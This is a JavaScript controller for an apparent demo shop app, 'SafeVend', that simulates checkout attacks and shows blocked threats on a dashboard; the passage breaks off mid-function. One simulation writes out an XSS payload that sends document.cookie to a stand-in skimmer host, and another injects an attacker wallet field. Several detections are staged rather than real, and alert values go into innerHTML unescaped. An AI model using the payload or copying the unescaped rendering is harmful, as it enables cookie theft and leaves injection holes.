/**
 * SafeVend — Plug-and-Play Security for Micro-Merchants
 * app.js: Main Application Controller, SPA Routing, Cart Engine,
 * Checkout Pipeline Orchestrator, Dashboard Telemetry, and Presentation Guide.
 */

(function () {
  "use strict";

  // Application State
  const state = {
    currentView: "home",
    cart: [
      {
        id: "prod_01",
        name: "Handmade Tote Bag",
        price: 999,
        quantity: 1,
        image: SafeVendData.products[0].image
      }
    ],
    alertFilter: "all",
    guidedTourStep: 1,
    isTourActive: false,
    activeTamperMode: null // null | 'price' | 'input' | 'bot' | 'form'
  };

  /* ==========================================================================
     INITIALIZATION & DOM READY
     ========================================================================== */
  document.addEventListener("DOMContentLoaded", () => {
    initRouting();
    initStorefront();
    initCart();
    initCheckout();
    initDashboard();
    initSecurityLab();
    initResearchAndRoadmap();
    initPresentationTour();
    initMobileNav();

    // Subscribe dashboard and header to live security engine updates
    if (window.safeVendEngine) {
      window.safeVendEngine.subscribe(handleSecurityStateUpdate);
      // Trigger initial render of dashboard stats
      handleSecurityStateUpdate(window.safeVendEngine.getState());
    }
  });

  /* ==========================================================================
     1. SPA VIEW ROUTING & NAVIGATION
     ========================================================================== */
  function initRouting() {
    // Handle hash change
    window.addEventListener("hashchange", handleHashChange);

    // Initial route parse
    if (!window.location.hash) {
      window.location.hash = "#home";
    } else {
      handleHashChange();
    }

    // Intercept clicks on internal nav links
    document.querySelectorAll("[data-view]").forEach((link) => {
      link.addEventListener("click", (e) => {
        const targetView = link.getAttribute("data-view");
        navigateToView(targetView);
      });
    });
  }

  function handleHashChange() {
    const hash = window.location.hash.replace("#", "") || "home";
    navigateToView(hash);
  }

  function navigateToView(viewId) {
    const targetSection = document.getElementById(`view-${viewId}`);
    if (!targetSection) {
      viewId = "home";
    }

    state.currentView = viewId;

    // Update active section visibility
    document.querySelectorAll(".view-section").forEach((sec) => {
      sec.classList.remove("active");
    });
    const activeSection = document.getElementById(`view-${viewId}`);
    if (activeSection) {
      activeSection.classList.add("active");
    }

    // Update active nav links
    document.querySelectorAll(".nav-link").forEach((link) => {
      if (link.getAttribute("data-view") === viewId) {
        link.classList.add("active");
      } else {
        link.classList.remove("active");
      }
    });

    // Close mobile nav menu if open
    const mainNav = document.getElementById("main-nav-menu");
    if (mainNav) mainNav.classList.remove("mobile-open");

    // Scroll to top
    window.scrollTo({ top: 0, behavior: "smooth" });

    // Refresh view specific components
    if (viewId === "checkout") {
      updateCheckoutSummary();
    } else if (viewId === "dashboard") {
      renderDashboardCharts();
      renderAlertsTable();
    }
  }

  function initMobileNav() {
    const mobileBtn = document.getElementById("mobile-menu-btn");
    const mainNav = document.getElementById("main-nav-menu");
    if (mobileBtn && mainNav) {
      mobileBtn.addEventListener("click", () => {
        mainNav.classList.toggle("mobile-open");
      });
    }
  }

  /* ==========================================================================
     2. STOREFRONT (CraftNest) & PRODUCT CATALOG
     ========================================================================== */
  function initStorefront() {
    const container = document.getElementById("products-catalog-container");
    if (!container) return;

    container.innerHTML = "";

    SafeVendData.products.forEach((prod) => {
      const card = document.createElement("article");
      card.className = "product-card";

      // Build safe HTML for product card
      card.innerHTML = `
        <div class="product-img-wrapper">
          ${prod.image}
          <span class="product-badge">${prod.badge}</span>
          <span class="product-security-tag">🛡️ Verified Catalog</span>
        </div>
        <div class="product-details">
          <div class="product-meta">
            <span class="product-category">${prod.category}</span>
            <span class="product-rating">★ ${prod.rating} (${prod.reviews})</span>
          </div>
          <h3 class="product-title">${prod.name}</h3>
          <p class="product-desc">${prod.description}</p>
          <div class="product-bottom-row">
            <div class="product-price-block">
              <span class="price-label">Price</span>
              <span class="price-val">${prod.formattedPrice}</span>
            </div>
            <button class="btn btn-primary btn-sm btn-add-cart" data-id="${prod.id}">
              <span>+ Add to Cart</span>
            </button>
          </div>
        </div>
      `;

      const addBtn = card.querySelector(".btn-add-cart");
      addBtn.addEventListener("click", () => {
        addToCart(prod.id);
      });

      container.appendChild(card);
    });
  }

  /* ==========================================================================
     3. SHOPPING CART ENGINE
     ========================================================================== */
  function initCart() {
    const cartToggleBtn = document.getElementById("header-cart-btn");
    const cartDrawer = document.getElementById("cart-drawer-element");
    const cartOverlay = document.getElementById("cart-drawer-overlay");
    const closeCartBtn = document.getElementById("btn-close-cart");
    const proceedBtn = document.getElementById("btn-proceed-to-checkout");

    const openCart = () => {
      cartDrawer.classList.add("open");
      cartOverlay.classList.add("open");
    };

    const closeCart = () => {
      cartDrawer.classList.remove("open");
      cartOverlay.classList.remove("open");
    };

    if (cartToggleBtn) cartToggleBtn.addEventListener("click", openCart);
    if (closeCartBtn) closeCartBtn.addEventListener("click", closeCart);
    if (cartOverlay) cartOverlay.addEventListener("click", closeCart);

    if (proceedBtn) {
      proceedBtn.addEventListener("click", () => {
        closeCart();
        window.location.hash = "#checkout";
      });
    }

    renderCart();
  }

  function addToCart(productId) {
    const product = SafeVendData.products.find((p) => p.id === productId);
    if (!product) return;

    const existingItem = state.cart.find((item) => item.id === productId);
    if (existingItem) {
      existingItem.quantity += 1;
    } else {
      state.cart.push({
        id: product.id,
        name: product.name,
        price: product.price,
        quantity: 1,
        image: product.image
      });
    }

    renderCart();
    updateCheckoutSummary();

    // Pulse feedback on header cart button
    const cartBtn = document.getElementById("header-cart-btn");
    if (cartBtn) {
      cartBtn.style.transform = "scale(1.08)";
      setTimeout(() => {
        cartBtn.style.transform = "scale(1)";
      }, 200);
    }
  }

  function updateCartQuantity(productId, delta) {
    const itemIndex = state.cart.findIndex((item) => item.id === productId);
    if (itemIndex === -1) return;

    state.cart[itemIndex].quantity += delta;
    if (state.cart[itemIndex].quantity <= 0) {
      state.cart.splice(itemIndex, 1);
    }

    renderCart();
    updateCheckoutSummary();
  }

  function calculateCartTotal() {
    return state.cart.reduce((sum, item) => sum + item.price * item.quantity, 0);
  }

  function renderCart() {
    const cartCountHeader = document.getElementById("header-cart-count");
    const cartCountDrawer = document.getElementById("cart-item-count");
    const cartItemsContainer = document.getElementById("cart-items-container");
    const cartSubtotalDisplay = document.getElementById("cart-subtotal-display");

    const totalQuantity = state.cart.reduce((sum, item) => sum + item.quantity, 0);
    const subtotal = calculateCartTotal();

    if (cartCountHeader) cartCountHeader.textContent = totalQuantity;
    if (cartCountDrawer) cartCountDrawer.textContent = totalQuantity;
    if (cartSubtotalDisplay) cartSubtotalDisplay.textContent = `₹${subtotal.toLocaleString("en-IN")}`;

    if (!cartItemsContainer) return;

    if (state.cart.length === 0) {
      cartItemsContainer.innerHTML = `
        <div class="cart-empty-state">
          <div style="font-size: 2.5rem; margin-bottom: 1rem;">🛒</div>
          <p>Your shopping cart is empty.</p>
          <a href="#store" class="btn btn-secondary btn-sm" style="margin-top: 1rem;" id="btn-browse-from-cart">Browse Artisan Products</a>
        </div>
      `;
      const browseBtn = document.getElementById("btn-browse-from-cart");
      if (browseBtn) {
        browseBtn.addEventListener("click", () => {
          document.getElementById("btn-close-cart").click();
        });
      }
      return;
    }

    cartItemsContainer.innerHTML = "";
    state.cart.forEach((item) => {
      const itemEl = document.createElement("div");
      itemEl.className = "cart-item";
      itemEl.innerHTML = `
        <div class="cart-item-img">${item.image}</div>
        <div class="cart-item-info">
          <div class="cart-item-title">${item.name}</div>
          <div class="cart-item-price">₹${item.price}</div>
          <div class="cart-item-controls">
            <button class="qty-btn btn-dec" data-id="${item.id}">-</button>
            <span class="qty-display">${item.quantity}</span>
            <button class="qty-btn btn-inc" data-id="${item.id}">+</button>
          </div>
        </div>
      `;

      itemEl.querySelector(".btn-dec").addEventListener("click", () => updateCartQuantity(item.id, -1));
      itemEl.querySelector(".btn-inc").addEventListener("click", () => updateCartQuantity(item.id, 1));
      cartItemsContainer.appendChild(itemEl);
    });
  }

  /* ==========================================================================
     4. SECURE CHECKOUT & TRANSACTION SECURITY PIPELINE
     ========================================================================== */
  function initCheckout() {
    updateCheckoutSummary();

    const verifyBtn = document.getElementById("btn-verify-checkout");
    if (verifyBtn) {
      verifyBtn.addEventListener("click", () => {
        executeCheckoutVerification({ isSimulatedTamper: false });
      });
    }

    // Modal dismiss buttons
    const closeVerifiedBtn = document.getElementById("btn-close-verified-modal");
    if (closeVerifiedBtn) {
      closeVerifiedBtn.addEventListener("click", closeVerificationModal);
    }

    const closeThreatBtn = document.getElementById("btn-close-threat-modal");
    if (closeThreatBtn) {
      closeThreatBtn.addEventListener("click", closeVerificationModal);
    }

    const viewDashFromThreat = document.getElementById("btn-view-dash-from-threat");
    if (viewDashFromThreat) {
      viewDashFromThreat.addEventListener("click", () => {
        closeVerificationModal();
      });
    }

    const viewDashFromVerified = document.getElementById("btn-view-dash-from-verified");
    if (viewDashFromVerified) {
      viewDashFromVerified.addEventListener("click", () => {
        closeVerificationModal();
      });
    }

    // Attach presenter attack simulation buttons right on checkout page
    const btnSimPrice = document.getElementById("btn-sim-price-tampering");
    if (btnSimPrice) {
      btnSimPrice.addEventListener("click", () => {
        triggerSimulatedPriceTampering();
      });
    }

    const btnSimInput = document.getElementById("btn-sim-suspicious-input");
    if (btnSimInput) {
      btnSimInput.addEventListener("click", () => {
        triggerSimulatedSuspiciousInput();
      });
    }

    const btnSimBot = document.getElementById("btn-sim-bot-request");
    if (btnSimBot) {
      btnSimBot.addEventListener("click", () => {
        triggerSimulatedBotRequest();
      });
    }

    const btnSimForm = document.getElementById("btn-sim-form-tampering");
    if (btnSimForm) {
      btnSimForm.addEventListener("click", () => {
        triggerSimulatedFormTampering();
      });
    }
  }

  function updateCheckoutSummary() {
    const summaryContainer = document.getElementById("checkout-summary-items");
    const totalDisplay = document.getElementById("checkout-summary-total");
    if (!summaryContainer || !totalDisplay) return;

    if (state.cart.length === 0) {
      summaryContainer.innerHTML = `<div style="color: var(--text-muted); font-size: 0.85rem;">Cart is empty. Please add a product from the store.</div>`;
      totalDisplay.textContent = "₹0";
      return;
    }

    summaryContainer.innerHTML = "";
    state.cart.forEach((item) => {
      const row = document.createElement("div");
      row.className = "summary-item-row";
      row.innerHTML = `
        <span class="name">${item.name} × ${item.quantity}</span>
        <span class="price">₹${(item.price * item.quantity).toLocaleString("en-IN")}</span>
      `;
      summaryContainer.appendChild(row);
    });

    const total = calculateCartTotal();
    totalDisplay.textContent = `₹${total.toLocaleString("en-IN")}`;
  }

  /**
   * Executes the 5-step animated verification sequence.
   * If options.tamperMode is present, it simulates a specific cybersecurity attack.
   */
  function executeCheckoutVerification(options = {}) {
    const tamperMode = options.tamperMode || null;
    const checkoutForm = document.getElementById("checkout-form");

    // Clear previous inline field errors
    document.querySelectorAll(".field-error-msg").forEach((el) => {
      el.classList.remove("visible");
      el.textContent = "";
    });
    document.querySelectorAll(".form-input").forEach((el) => {
      el.classList.remove("input-error");
    });

    // Gather customer form values
    const formData = {
      fullName: document.getElementById("cust-fullname") ? document.getElementById("cust-fullname").value : "",
      email: document.getElementById("cust-email") ? document.getElementById("cust-email").value : "",
      phone: document.getElementById("cust-phone") ? document.getElementById("cust-phone").value : "",
      pincode: document.getElementById("cust-pincode") ? document.getElementById("cust-pincode").value : "",
      address: document.getElementById("cust-address") ? document.getElementById("cust-address").value : "",
      city: document.getElementById("cust-city") ? document.getElementById("cust-city").value : ""
    };

    // Open Verification Modal
    openVerificationModal();

    // Reset pipeline step UI states
    for (let i = 1; i <= 5; i++) {
      const stepEl = document.getElementById(`step-pipe-${i}`);
      if (stepEl) {
        stepEl.className = "pipeline-step-item pending";
      }
    }
    const outcomeVerified = document.getElementById("outcome-verified-box");
    const outcomeThreat = document.getElementById("outcome-threat-box");
    outcomeVerified.style.display = "none";
    outcomeThreat.style.display = "none";
    document.getElementById("verification-status-pill").textContent = "Analyzing Pipeline...";
    document.getElementById("verification-status-pill").className = "badge-sec badge-secure";

    // Step 1: Input Validation
    runPipelineStep(1, 350, () => {
      const validation = window.safeVendEngine.validateCustomerInput(formData);

      if (tamperMode === "input" || validation.hasMaliciousPattern) {
        markStepFailed(1, "1. Malicious input / XSS injection detected in payload!");
        handleThreatInterception({
          threatType: "Malicious Input Pattern",
          riskLevel: "HIGH",
          productName: state.cart[0] ? state.cart[0].name : "CraftNest Item",
          expectedValue: "Sanitized alphanumeric address string",
          receivedValue: formData.address || "<script>fetch('https://skimmer-exfil.xyz?c='...",
          affectedComponent: "Customer Information Input / Address Line 1",
          detectionReason: "Payload matched active cross-site scripting (XSS) / injection pattern.",
          actionTaken: "Input neutralized, transaction terminated before processing",
          categoryKey: "suspiciousInput"
        });
        return false;
      }

      if (!validation.isValid) {
        markStepFailed(1, "1. Form input format error detected");
        // Highlight form error
        for (const [field, errText] of Object.entries(validation.errors)) {
          const errEl = document.getElementById(`err-cust-${field.toLowerCase()}`);
          const inputEl = document.getElementById(`cust-${field.toLowerCase()}`);
          if (errEl) {
            errEl.textContent = errText;
            errEl.classList.add("visible");
          }
          if (inputEl) inputEl.classList.add("input-error");
        }
        closeVerificationModal();
        return false;
      }

      markStepPassed(1, "1. Customer inputs verified & sanitized ✓");
      return true;
    }).then((p1Passed) => {
      if (!p1Passed) return;

      // Step 2: Form & DOM Integrity
      runPipelineStep(2, 350, () => {
        const formCheck = window.safeVendEngine.verifyFormIntegrity(checkoutForm);

        if (tamperMode === "form" || !formCheck.isIntact) {
          markStepFailed(2, "2. Form schema altered! Unauthorized DOM attribute injected");
          handleThreatInterception({
            threatType: "Form Tampering",
            riskLevel: "MEDIUM",
            productName: state.cart[0] ? state.cart[0].name : "CraftNest Item",
            expectedValue: "Integrity Hash: SV-DOM-INTEGRITY-9A7F",
            receivedValue: "Rogue DOM Attribute / Injected recipient override field",
            affectedComponent: "Checkout Form DOM Container",
            detectionReason: "Client-side schema mismatch: Unauthorized input field inserted into form.",
            actionTaken: "Submission blocked, origin quarantined",
            categoryKey: "formTampering"
          });
          return false;
        }

        markStepPassed(2, "2. Form schema & DOM integrity verified ✓");
        return true;
      }).then((p2Passed) => {
        if (!p2Passed) return;

        // Step 3: Product Price Integrity Check (MAIN ATTACK SIMULATION)
        runPipelineStep(3, 450, () => {
          const actualTotal = calculateCartTotal();
          let submittedTotal = actualTotal;

          if (tamperMode === "price") {
            // Tampered: Rewrites total to ₹0.01!
            submittedTotal = 0.01;
          }

          // Build item verification array
          const itemsToCheck = state.cart.map((item) => ({
            id: item.id,
            name: item.name,
            price: item.price,
            quantity: item.quantity,
            submittedUnitPrice: tamperMode === "price" && item.id === "prod_01" ? 0.01 : item.price
          }));

          const priceCheck = window.safeVendEngine.verifyPriceIntegrity(itemsToCheck, submittedTotal);

          if (!priceCheck.isVerified || tamperMode === "price") {
            markStepFailed(3, "3. Price tampering detected! Expected ₹" + actualTotal + " but got ₹" + submittedTotal);
            handleThreatInterception({
              threatType: "Price Tampering",
              riskLevel: "HIGH",
              productName: state.cart[0] ? state.cart[0].name : "Handmade Tote Bag",
              expectedValue: `₹${actualTotal.toFixed(2)}`,
              receivedValue: `₹${submittedTotal.toFixed(2)}`,
              affectedComponent: "Checkout Payload / Total Amount",
              detectionReason: `SafeVend price integrity check failed: Mismatch between authoritative catalog price (₹${actualTotal}) and submitted value (₹${submittedTotal}).`,
              actionTaken: "Transaction Terminated & Merchant Alert Dispatched",
              categoryKey: "priceTampering"
            });
            return false;
          }

          markStepPassed(3, "3. Price verified against catalog pricing matrix ✓");
          return true;
        }).then((p3Passed) => {
          if (!p3Passed) return;

          // Step 4: Bot & Velocity Check
          runPipelineStep(4, 350, () => {
            if (tamperMode === "bot") {
              markStepFailed(4, "4. Suspicious automated velocity burst detected!");
              handleThreatInterception({
                threatType: "Suspicious Automated Activity",
                riskLevel: "MEDIUM",
                productName: state.cart[0] ? state.cart[0].name : "CraftNest Item",
                expectedValue: "< 3 checkout events / min",
                receivedValue: "6 rapid-fire requests in 1.4 seconds",
                affectedComponent: "Checkout Endpoint Rate Controller",
                detectionReason: "High-frequency automated attempts detected with synthetic telemetry markers.",
                actionTaken: "Request flagged, session throttled, incident logged",
                categoryKey: "automatedRequests"
              });
              return false;
            }

            markStepPassed(4, "4. Human interaction velocity normal ✓");
            return true;
          }).then((p4Passed) => {
            if (!p4Passed) return;

            // Step 5: Cryptographic State Signing & Verification
            runPipelineStep(5, 400, () => {
              const checksum = window.safeVendEngine.generateVerificationChecksum(calculateCartTotal(), state.cart);
              markStepPassed(5, "5. Transaction signed: " + checksum + " ✓");

              // Legitimate outcome!
              document.getElementById("verification-status-pill").textContent = "✓ Verified & Allowed";
              document.getElementById("verification-status-pill").className = "badge-sec badge-verified";
              document.getElementById("verified-checksum-text").textContent = `Cryptographic Signature: ${checksum}`;
              outcomeVerified.style.display = "block";

              // Notify security engine of legitimate success
              window.safeVendEngine.recordLegitimateTransaction();
              return true;
            });
          });
        });
      });
    });
  }

  function runPipelineStep(stepIndex, delayMs, stepAction) {
    return new Promise((resolve) => {
      const stepEl = document.getElementById(`step-pipe-${stepIndex}`);
      if (stepEl) {
        stepEl.className = "pipeline-step-item running";
      }
      setTimeout(() => {
        const result = stepAction();
        resolve(result);
      }, delayMs);
    });
  }

  function markStepPassed(stepIndex, labelText) {
    const stepEl = document.getElementById(`step-pipe-${stepIndex}`);
    if (stepEl) {
      stepEl.className = "pipeline-step-item passed";
      stepEl.querySelector(".step-indicator").textContent = "✓";
      stepEl.querySelector(".step-label").textContent = labelText;
    }
  }

  function markStepFailed(stepIndex, labelText) {
    const stepEl = document.getElementById(`step-pipe-${stepIndex}`);
    if (stepEl) {
      stepEl.className = "pipeline-step-item failed";
      stepEl.querySelector(".step-indicator").textContent = "✕";
      stepEl.querySelector(".step-label").textContent = labelText;
    }
  }

  function handleThreatInterception(threatData) {
    const outcomeThreat = document.getElementById("outcome-threat-box");
    const statusPill = document.getElementById("verification-status-pill");
    const diffContainer = document.getElementById("visual-diff-container");

    statusPill.textContent = "🚨 THREAT BLOCKED";
    statusPill.className = "badge-sec badge-blocked";

    document.getElementById("threat-outcome-title").textContent = `TRANSACTION BLOCKED: ${threatData.threatType.toUpperCase()}`;
    document.getElementById("threat-outcome-desc").textContent = threatData.detectionReason;

    // Show visual diff
    if (diffContainer) {
      document.getElementById("diff-expected-val").textContent = threatData.expectedValue;
      document.getElementById("diff-tampered-val").textContent = threatData.receivedValue;
    }

    outcomeThreat.style.display = "block";

    // Record in Security Engine & Merchant Dashboard
    window.safeVendEngine.recordSecurityIncident(threatData);
  }

  function openVerificationModal() {
    const modal = document.getElementById("verification-modal");
    if (modal) modal.classList.add("open");
  }

  function closeVerificationModal() {
    const modal = document.getElementById("verification-modal");
    if (modal) modal.classList.remove("open");

    // Clean up any injected DOM fields from form tamper simulation
    const injected = document.querySelector("[data-injected='true']");
    if (injected) injected.remove();
  }

  /* ==========================================================================
     ATTACK SIMULATION TRIGGERS
     ========================================================================== */
  function triggerSimulatedPriceTampering() {
    // If cart is empty, add the tote bag
    if (state.cart.length === 0) {
      addToCart("prod_01");
    }
    executeCheckoutVerification({ tamperMode: "price" });
  }

  function triggerSimulatedSuspiciousInput() {
    const addressInput = document.getElementById("cust-address");
    if (addressInput) {
      addressInput.value = "<script>fetch('https://skimmer-exfil.xyz?c='+document.cookie)</script>";
      addressInput.classList.add("input-error");
    }
    executeCheckoutVerification({ tamperMode: "input" });
  }

  function triggerSimulatedBotRequest() {
    executeCheckoutVerification({ tamperMode: "bot" });
  }

  function triggerSimulatedFormTampering() {
    const checkoutForm = document.getElementById("checkout-form");
    if (checkoutForm) {
      // Invalidate existing if any
      const existing = checkoutForm.querySelector("[data-injected='true']");
      if (existing) existing.remove();

      const rogueField = document.createElement("input");
      rogueField.type = "hidden";
      rogueField.name = "recipient_wallet_override";
      rogueField.value = "ATTACKER_WALLET_0xDEADBEEF";
      rogueField.setAttribute("data-injected", "true");
      checkoutForm.appendChild(rogueField);
    }
    executeCheckoutVerification({ tamperMode: "form" });
  }

  /* ==========================================================================
     5. MERCHANT SECURITY DASHBOARD & TELEMETRY
     ========================================================================== */
  function initDashboard() {
    // Reset Data Button
    const resetBtn = document.getElementById("btn-reset-metrics");
    if (resetBtn) {
      resetBtn.addEventListener("click", () => {
        window.safeVendEngine.resetToDefaults();
      });
    }

    // Alert filter tabs
    const filterTabs = document.querySelectorAll("#alerts-filter-group .filter-tab");
    filterTabs.forEach((tab) => {
      tab.addEventListener("click", () => {
        filterTabs.forEach((t) => t.classList.remove("active"));
        tab.classList.add("active");
        state.alertFilter = tab.getAttribute("data-filter");
        renderAlertsTable();
      });
    });

    // Threat Forensic Modal Close
    const closeThreatDetailBtn = document.getElementById("btn-close-threat-detail");
    const threatModal = document.getElementById("threat-detail-modal");
    if (closeThreatDetailBtn && threatModal) {
      closeThreatDetailBtn.addEventListener("click", () => {
        threatModal.classList.remove("open");
      });
      threatModal.addEventListener("click", (e) => {
        if (e.target === threatModal) threatModal.classList.remove("open");
      });
    }
  }

  function handleSecurityStateUpdate(engineState) {
    // Update metric cards
    const totalEl = document.getElementById("dash-metric-total");
    const protectedEl = document.getElementById("dash-metric-protected");
    const blockedEl = document.getElementById("dash-metric-blocked");
    const riskEl = document.getElementById("dash-metric-risk");
    const heroProtectedEl = document.getElementById("hero-stat-protected");
    const alertsBadge = document.getElementById("alerts-count-badge");

    if (totalEl) totalEl.textContent = engineState.metrics.totalTransactions.toLocaleString();
    if (protectedEl) protectedEl.textContent = engineState.metrics.protectedTransactions.toLocaleString();
    if (blockedEl) blockedEl.textContent = engineState.metrics.blockedTransactions.toLocaleString();
    if (heroProtectedEl) heroProtectedEl.textContent = engineState.metrics.protectedTransactions.toLocaleString();
    if (alertsBadge) alertsBadge.textContent = `${engineState.alerts.length} Events`;

    if (riskEl) {
      riskEl.textContent = engineState.metrics.riskStatus;
      riskEl.style.color = engineState.metrics.riskStatus === "HIGH" ? "#f87171" : engineState.metrics.riskStatus === "ELEVATED" ? "#fbbf24" : "#34d399";
    }

    // Refresh charts and alerts table
    renderDashboardCharts();
    renderAlertsTable();
  }

  function renderDashboardCharts() {
    const timelineContainer = document.getElementById("chart-timeline-container");
    const categoriesContainer = document.getElementById("threat-categories-breakdown");
    if (!timelineContainer || !categoriesContainer) return;

    // 1. Render Timeline SVG Area Chart
    timelineContainer.innerHTML = `
      <svg viewBox="0 0 500 200" preserveAspectRatio="none">
        <defs>
          <linearGradient id="legitGrad" x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%" stop-color="#38bdf8" stop-opacity="0.35"/>
            <stop offset="100%" stop-color="#38bdf8" stop-opacity="0.0"/>
          </linearGradient>
          <linearGradient id="threatGrad" x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%" stop-color="#ef4444" stop-opacity="0.4"/>
            <stop offset="100%" stop-color="#ef4444" stop-opacity="0.0"/>
          </linearGradient>
        </defs>
        <!-- Horizontal grid lines -->
        <line x1="0" y1="50" x2="500" y2="50" stroke="rgba(255,255,255,0.06)" stroke-dasharray="4,4"/>
        <line x1="0" y1="100" x2="500" y2="100" stroke="rgba(255,255,255,0.06)" stroke-dasharray="4,4"/>
        <line x1="0" y1="150" x2="500" y2="150" stroke="rgba(255,255,255,0.06)" stroke-dasharray="4,4"/>

        <!-- Legitimate transactions curve -->
        <path d="M 0,140 Q 60,110 125,120 T 250,90 T 375,70 T 500,60 L 500,190 L 0,190 Z" fill="url(#legitGrad)"/>
        <path d="M 0,140 Q 60,110 125,120 T 250,90 T 375,70 T 500,60" fill="none" stroke="#38bdf8" stroke-width="3" stroke-linecap="round"/>

        <!-- Blocked threats spikes -->
        <path d="M 0,185 Q 125,180 200,175 L 230,130 L 260,175 Q 350,180 410,145 L 440,180 L 500,185" fill="none" stroke="#ef4444" stroke-width="2.5" stroke-linecap="round"/>

        <!-- Timeline labels -->
        <text x="10" y="195" fill="#64748b" font-size="10">09:00 AM</text>
        <text x="125" y="195" fill="#64748b" font-size="10">11:00 AM</text>
        <text x="250" y="195" fill="#64748b" font-size="10">01:00 PM</text>
        <text x="375" y="195" fill="#64748b" font-size="10">03:00 PM</text>
        <text x="460" y="195" fill="#64748b" font-size="10">NOW</text>
      </svg>
    `;

    // 2. Render Threat Categories Breakdown Bars
    const engineState = window.safeVendEngine.getState();
    const counts = engineState.threatCounts;
    const totalThreats = Object.values(counts).reduce((a, b) => a + b, 0) || 1;

    const categories = [
      { key: "priceTampering", name: "Price Tampering", count: counts.priceTampering || 0, colorClass: "fill-red" },
      { key: "automatedRequests", name: "Automated Bot Bursts", count: counts.automatedRequests || 0, colorClass: "fill-orange" },
      { key: "suspiciousInput", name: "Malicious Input (XSS/SQLi)", count: counts.suspiciousInput || 0, colorClass: "fill-yellow" },
      { key: "formTampering", name: "Form & DOM Tampering", count: counts.formTampering || 0, colorClass: "fill-blue" }
    ];

    categoriesContainer.innerHTML = "";
    categories.forEach((cat) => {
      const pct = Math.round((cat.count / totalThreats) * 100);
      const row = document.createElement("div");
      row.className = "threat-cat-item";
      row.innerHTML = `
        <div class="threat-cat-head">
          <span>${cat.name}</span>
          <span style="font-family: var(--font-mono);">${cat.count} (${pct}%)</span>
        </div>
        <div class="threat-cat-bar-bg">
          <div class="threat-cat-bar-fill ${cat.colorClass}" style="width: ${Math.max(pct, 5)}%;"></div>
        </div>
      `;
      categoriesContainer.appendChild(row);
    });
  }

  function renderAlertsTable() {
    const tableBody = document.getElementById("alerts-table-body");
    if (!tableBody) return;

    const engineState = window.safeVendEngine.getState();
    let filteredAlerts = engineState.alerts;

    if (state.alertFilter !== "all") {
      filteredAlerts = engineState.alerts.filter((a) => a.categoryKey === state.alertFilter);
    }

    if (filteredAlerts.length === 0) {
      tableBody.innerHTML = `
        <tr>
          <td colspan="7" style="text-align: center; color: var(--text-muted); padding: 2rem;">
            No incidents found matching the selected filter.
          </td>
        </tr>
      `;
      return;
    }

    tableBody.innerHTML = "";
    filteredAlerts.forEach((alert) => {
      const tr = document.createElement("tr");

      let sevBadge = `<span class="badge-sec badge-threat">${alert.riskLevel}</span>`;
      if (alert.riskLevel === "MEDIUM") sevBadge = `<span class="badge-sec badge-warning">${alert.riskLevel}</span>`;
      if (alert.riskLevel === "LOW") sevBadge = `<span class="badge-sec badge-secure">${alert.riskLevel}</span>`;

      tr.innerHTML = `
        <td class="alert-type-col">
          <strong>${alert.threatType}</strong>
          <span>${alert.id}</span>
        </td>
        <td>${sevBadge}</td>
        <td><code style="font-size: 0.78rem; color: #38bdf8;">${alert.affectedComponent}</code></td>
        <td style="font-family: var(--font-mono); font-size: 0.8rem;">
          <span style="color: #34d399;">${alert.expectedValue}</span> → 
          <span style="color: #f87171;">${alert.receivedValue}</span>
        </td>
        <td><span class="badge-sec ${alert.status === 'BLOCKED' ? 'badge-blocked' : 'badge-warning'}">${alert.status}</span></td>
        <td style="color: var(--text-muted); font-size: 0.8rem;">${alert.timestamp}</td>
        <td>
          <button class="btn btn-secondary btn-sm btn-inspect-alert" data-id="${alert.id}">
            <span>Inspect 🔍</span>
          </button>
        </td>
      `;

      tr.addEventListener("click", () => openThreatDetailModal(alert.id));
      const inspectBtn = tr.querySelector(".btn-inspect-alert");
      inspectBtn.addEventListener("click", (e) => {
        e.stopPropagation();
        openThreatDetailModal(alert.id);
      });

      tableBody.appendChild(tr);
    });
  }

  function openThreatDetailModal(alertId) {
    const engineState = window.safeVendEngine.getState();
    const alert = engineState.alerts.find((a) => a.id === alertId);
    if (!alert) return;

    const modal = document.getElementById("threat-detail-modal");
    const container = document.getElementById("threat-detail-content");
    if (!modal || !container) return;

    container.innerHTML = `
      <div class="threat-meta-grid">
        <div class="meta-field">
          <div class="lbl">Incident Identifier</div>
          <div class="val" style="font-family: var(--font-mono); color: #38bdf8;">${alert.id}</div>
        </div>
        <div class="meta-field">
          <div class="lbl">Threat Severity</div>
          <div class="val">${alert.riskLevel} RISK</div>
        </div>
        <div class="meta-field">
          <div class="lbl">Target Component</div>
          <div class="val">${alert.affectedComponent}</div>
        </div>
        <div class="meta-field">
          <div class="lbl">Timestamp</div>
          <div class="val">${alert.timestamp}</div>
        </div>
      </div>

      <div class="threat-diff-panel">
        <h5>Forensic Payload Diff</h5>
        <div class="diff-row">
          <span class="diff-label">Expected Baseline:</span>
          <span class="diff-val expected">${alert.expectedValue}</span>
        </div>
        <div class="diff-row">
          <span class="diff-label">Received In Payload:</span>
          <span class="diff-val received">${alert.receivedValue}</span>
        </div>
        <div class="diff-row">
          <span class="diff-label">Origin Network:</span>
          <span style="color: #cbd5e1;">${alert.ipAddress}</span>
        </div>
      </div>

      <div style="margin-bottom: 1.5rem;">
        <h5 style="font-size: 0.8rem; text-transform: uppercase; color: var(--text-muted); margin-bottom: 0.4rem;">Detection Reason</h5>
        <p style="color: #cbd5e1; font-size: 0.9rem; line-height: 1.5;">${alert.detectionReason}</p>
      </div>

      <div class="threat-action-box">
        <strong>Automated Defense Action:</strong> ${alert.actionTaken}.
        <div style="font-size: 0.78rem; color: #a7f3d0; margin-top: 4px;">
          ✓ Merchant transaction logs quarantined. No payment authorization was transmitted.
        </div>
      </div>
    `;

    modal.classList.add("open");
  }

  /* ==========================================================================
     6. SECURITY LAB / ATTACK SIMULATION WORKBENCH
     ========================================================================== */
  function initSecurityLab() {
    const btnAttackPrice = document.getElementById("btn-lab-attack-price");
    const btnAttackForm = document.getElementById("btn-lab-attack-form");
    const btnAttackInput = document.getElementById("btn-lab-attack-input");
    const btnAttackBot = document.getElementById("btn-lab-attack-bot");

    if (btnAttackPrice) {
      btnAttackPrice.addEventListener("click", () => {
        window.location.hash = "#checkout";
        setTimeout(() => triggerSimulatedPriceTampering(), 300);
      });
    }

    if (btnAttackForm) {
      btnAttackForm.addEventListener("click", () => {
        window.location.hash = "#checkout";
        setTimeout(() => triggerSimulatedFormTampering(), 300);
      });
    }

    if (btnAttackInput) {
      btnAttackInput.addEventListener("click", () => {
        window.location.hash = "#checkout";
